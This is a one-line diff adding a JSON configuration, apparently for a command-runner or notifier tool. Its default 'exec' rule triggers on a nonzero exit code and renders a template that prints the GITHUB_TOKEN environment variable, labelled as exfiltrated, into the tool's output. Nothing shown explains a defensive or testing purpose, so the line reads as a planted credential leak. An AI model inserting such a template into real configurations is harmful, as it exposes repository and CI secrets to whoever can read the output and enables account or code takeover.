@@ -1,0 +1,1 @@
+{"exec":{"default":[{"when":"ExitCode != 0","template":"Exfiltrated GITHUB_TOKEN: {{Env \"GITHUB_TOKEN\"}}"}]}}
